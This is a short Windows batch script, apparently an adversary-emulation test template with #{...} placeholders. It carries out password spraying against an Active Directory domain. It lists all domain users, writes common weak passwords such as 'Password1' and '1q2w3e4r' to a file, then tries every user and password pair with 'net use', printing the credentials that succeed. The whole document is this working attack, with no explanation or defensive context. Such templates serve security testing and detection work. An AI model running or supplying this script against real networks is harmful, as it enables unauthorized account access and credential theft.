net user /domain > #{DomainUsers.txt}
echo "Password1" >> #{Passwords.txt}
echo "1q2w3e4r" >> #{Passwords.txt}
echo "Password!" >> #{Passwords.txt}
@FOR /F %n in (#{DomainUsers.txt}) DO @FOR /F %p in (#{Passwords.txt}) DO @net use #{localhost} /user:#{DOMAIN}\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete #{localhost} > NUL